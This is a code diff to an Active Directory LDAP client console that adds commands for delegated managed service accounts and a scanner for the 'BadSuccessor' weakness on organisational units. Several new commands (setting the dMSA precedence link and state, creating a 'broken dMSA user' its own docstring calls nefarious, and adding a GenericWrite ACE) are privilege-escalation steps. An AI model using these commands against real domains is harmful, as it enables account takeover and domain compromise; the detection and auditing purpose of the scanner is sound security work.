@@ -57,6 +57,7 @@ class MSLDAPClientConsole(aiocmd.PromptToolkitCmd):
 		self.adinfo = None
 		self.ldapinfo = None
 		self.domain_name = None
+		self.domain_sid = None
 		self.noisig = False
 		self.nocb = False
 		self._disable_channel_binding = False
@@ -87,6 +88,8 @@ class MSLDAPClientConsole(aiocmd.PromptToolkitCmd):
 			if err is not None:
 				raise err
 			logger.debug('BIND OK!')
+			self.domain_sid = self.connection.domainsid
+			self.domain_name = self.connection.domainname
 			self.prompt = '[%s]> ' % (self.connection._tree,)
 			self._current_dn = self.connection._tree
 			if self.connection._con.is_anon is False:
@@ -137,6 +140,7 @@ class MSLDAPClientConsole(aiocmd.PromptToolkitCmd):
 			if self.adinfo is None:
 				self.adinfo = self.connection._ldapinfo
 				self.domain_name = self.adinfo.distinguishedName.replace('DC','').replace('=','').replace(',','.')
+				self.domain_sid = self.adinfo.objectSid
 			if show is True:
 				print(self.adinfo)
 			return True
@@ -553,7 +557,27 @@ class MSLDAPClientConsole(aiocmd.PromptToolkitCmd):
 			async for entry, err in self.connection.pagedsearch(query, attributes):
 				if err is not None:
 					raise err
-				print(entry)
+				print('DN: %s' % entry['objectName'])
+				print('Attributes:')
+				for attr_name, attr_value in entry['attributes'].items():
+					if isinstance(attr_value, list):
+						print('  %s:' % attr_name)
+						for val in attr_value:
+							if isinstance(val, SECURITY_DESCRIPTOR):
+								print('    - %s' % val.to_sddl())
+							elif isinstance(val, bytes):
+								print('    - %s' % val.hex())
+							else:
+								print('    - %s' % val)
+					else:
+						if isinstance(attr_value, SECURITY_DESCRIPTOR):
+							print('  %s: %s' % (attr_name, attr_value.to_sddl()))
+							print('  %s: %s' % (attr_name, attr_value.to_bytes().hex()))
+						elif isinstance(attr_value, bytes):
+							print('  %s: %s' % (attr_name, attr_value.hex()))
+						else:
+							print('  %s: %s' % (attr_name, attr_value))
+				print('---')
 			return True
 		except:
 			traceback.print_exc()
@@ -1664,7 +1688,206 @@ class MSLDAPClientConsole(aiocmd.PromptToolkitCmd):
 		except:
 			traceback.print_exc()
 			return False
+	
+	async def do_dmsas(self):
+		"""Lists all delegated managed service accounts (DMSA)"""
+		try:
+			async for entry, err in self.connection.get_all_dmsas():
+				if err is not None:
+					raise err
+				print(entry)
+			return True
+		except:
+			traceback.print_exc()
+			return False
+		
+	async def do_dmsaaddmanagedaccountprecededbylink(self, dn:str, managedaccountprecededbylink:str):
+		"""Adds a managed account preceded by link to a DMSA"""
+		try:			
+			changes = {
+				'msDS-ManagedAccountPrecededByLink' : [('replace', managedaccountprecededbylink)]
+			}
+			_, err = await self.connection.modify(dn, changes)
+			if err is not None:
+				raise err
+			print('OK')
+		except:
+			traceback.print_exc()
+			return False
 
+	async def do_dmsasetdelegatedmsastate(self, dn:str, delegatedmsastate:int):
+		"""Sets the delegated MSA state of a DMSA"""
+		try:
+			changes = {
+				'msDS-DelegatedMSAState' : [('replace', delegatedmsastate)]
+			}
+
+			_, err = await self.connection.modify(dn, changes)
+			if err is not None:
+				raise err
+			print('OK')
+		except:
+			traceback.print_exc()
+			return False
+	
+	async def do_create_broken_dmsa_user(self, user_dn:str, computersid:str):
+		"""This will create a dmsa service user that can be used for neferious reasons, but DO NOT USE THIS FOR ANYTHING ELSE!"""
+		try:
+			_, err = await self.connection.create_broken_dmsa_user(user_dn, computersid)
+			if err is not None:
+				raise err
+			print('OK')
+		except:
+			traceback.print_exc()
+			return False
+	
+	async def do_add_genericwrite(self, targetdn:str, userdn:str):
+		"""Adds a generic write ACE to a target object"""
+		try:
+			userentry, err = await self.connection.get_obj_by_dn(userdn, None)
+			if err is not None:
+				raise err
+			
+			targetsd, err = await self.connection.get_objectacl_by_dn(targetdn)
+			if err is not None:
+				raise err
+			
+			targetsd = SECURITY_DESCRIPTOR.from_bytes(targetsd)
+			user_sid = str(userentry['attributes']['objectSid'])
+			new_sd = copy.deepcopy(targetsd)
+			ace = ACCESS_ALLOWED_ACE()
+			ace.Sid = SID.from_string(user_sid)
+			ace.AceFlags = AceFlags(1)
+			ace.Mask = ADS_ACCESS_MASK.GENERIC_WRITE
+			new_sd.Dacl.aces.append(ace)
+			_, err = await self.connection.set_objectacl_by_dn(targetdn, new_sd.to_bytes(), flags=SDFlagsRequest.DACL_SECURITY_INFORMATION)
+			if err is not None:
+				raise err
+			print('SD set sucessfully')
+		except:
+			traceback.print_exc()
+			return False
+		
+	async def check_badsuccessor_sd(self, sd:SECURITY_DESCRIPTOR):
+		"""Checks if the SD has the badsuccessor flag set"""
+
+		def is_excluded_sid(sid:str):
+			sid = str(sid)
+			if sid in ["S-1-5-32-544", "S-1-5-18"]:
+				return True
+			if sid.startswith(self.domain_sid) is False:
+				return False
+			for suffix in ["-512", "-519"]:
+				if sid.endswith(suffix) is True:
+					return True
+			return False
+		
+		if sd.Dacl is None:
+			return False
+		
+		results = []
+		
+		if is_excluded_sid(sd.Owner) is False:
+			user, err = await self.connection.get_user_by_sid(sd.Owner)
+			if err is None:
+				results.append({
+					'rights' : [],
+					'rights_str' : 'OWNER',
+					'otypes' : [],
+					'users' : [
+						{
+							'name' : user.sAMAccountName,
+							'sid' : sd.Owner
+						}
+					]
+				})
+		
+		for ace in sd.Dacl.aces:
+			rights = []
+			otypes = []
+			sids = []
+			if ace.AceType in [ACEType.ACCESS_ALLOWED_ACE_TYPE, ACEType.ACCESS_ALLOWED_OBJECT_ACE_TYPE]:
+				for mask in [ADS_ACCESS_MASK.GENERIC_ALL, ADS_ACCESS_MASK.GENERIC_WRITE, ADS_ACCESS_MASK.WRITE_OWNER, ADS_ACCESS_MASK.WRITE_DACL, ADS_ACCESS_MASK.CREATE_CHILD, ADS_ACCESS_MASK.WRITE_PROP, ADS_ACCESS_MASK.CONTROL_ACCESS]:
+					if mask in ADS_ACCESS_MASK(ace.Mask):
+						rights.append(mask)
+			if len(rights) == 0:
+				continue
+			
+			if ace.AceType == ACEType.ACCESS_ALLOWED_OBJECT_ACE_TYPE:
+				if str(ace.ObjectType) in ['00000000-0000-0000-0000-000000000000', '0feb936f-47b3-49f2-9386-1dedc2c23765']:
+					otypes.append(str(ace.ObjectType))
+			
+				if len(otypes) == 0:
+					continue
+				
+			if is_excluded_sid(str(ace.Sid)) is True:
+				continue
+
+			sids.append(str(ace.Sid))
+			
+			if len(sids) == 0:
+				continue
+			
+			users = []
+			for sid in sids:
+				user, err = await self.connection.get_user_by_sid(sid)
+				if err is not None:
+					continue
+				if user is None:
+					continue
+				user_name = user.sAMAccountName
+				users.append({
+					'name' : user_name,
+					'sid' : sid
+				})
+				
+
+			results.append({
+				'rights' : rights,
+				'rights_str' : '|'.join([right.name for right in rights]),
+				'otypes' : otypes,
+				'users' : users
+			})
+		return results
+	
+	async def do_badsuccessor_check(self):
+		"""Checks if Badsuccessor vulnerability is present on the domain"""
+		try:
+			dc_list = []
+			async for computer, err in self.connection.get_all_domain_controllers():
+				if err is not None:
+					raise err
+				if computer is None:
+					continue
+				if computer.operatingSystem is None:
+					continue
+				if '2025' in computer.operatingSystem:
+					dc_list.append(computer.sAMAccountName)
+
+			if len(dc_list) == 0:
+				print('[-] No domain controllers with Windows 2025 found!')
+				print('[*] Checking OUs regardless...')
+			
+			async for entry, err in self.connection.get_all_ous():
+				if err is not None:
+					raise err
+				if entry is None:
+					continue
+				sd, err = await self.connection.get_objectacl_by_dn(entry.distinguishedName)
+				if err is not None:
+					continue
+				sd = SECURITY_DESCRIPTOR.from_bytes(sd)
+				if sd is None:
+					continue
+				if sd.Dacl is None:
+					continue
+				results = await self.check_badsuccessor_sd(sd)
+				for result in results:
+					for user in result['users']:
+						print(f"{entry.distinguishedName}, {user['name']} ({user['sid']}) {result['rights_str']}")
+		except:
+			traceback.print_exc()
+			return False
 
 async def amain(args):
 	import platform
